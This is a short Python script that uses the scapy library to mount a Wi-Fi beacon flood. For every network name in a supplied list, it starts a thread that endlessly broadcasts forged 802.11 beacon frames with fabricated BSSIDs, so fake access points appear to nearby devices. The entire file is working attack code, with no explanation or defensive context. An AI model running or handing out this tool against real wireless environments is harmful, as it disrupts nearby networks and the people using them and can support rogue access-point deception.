#!/usr/bin/sudo /usr/bin/python3

from threading import Thread
from scapy.all import *
import sys

iface=sys.argv[1]
ssid_list=sys.argv[2]

ssid_arr=[]
with open(ssid_list,"r") as f:
    for i in f.readlines():
        ssid_arr.append(i.rstrip().encode('utf-8'))

def beacon_flood(dst,src,bss,ssid):
    global iface
    dot11=Dot11(type=0,subtype=8,addr1=dst,addr2=src,addr3=bss)
    beacon=Dot11Beacon()
    wireless_mgmt=Dot11Elt(ID="SSID",info=ssid,len=len(ssid))
    frame=RadioTap()/dot11/beacon/wireless_mgmt
    sendp(frame,iface,loop=1,inter=0.1)

#print(ssid_arr)

thread_arr=[]
src="ff:ff:ff:ff:ff:ff"
dst="00:11:22:33:44:55"
cnt=0
for ssid in ssid_arr:
    bss="66:77:88:99:AA:"+"%02X"%(cnt)
    cnt+=1
    if cnt>255:
        cnt=0
    thread_arr.append(Thread(target=beacon_flood,args=(src,dst,bss,ssid)))

for t in thread_arr:
    t.start()

for t in thread_arr:
    t.join()

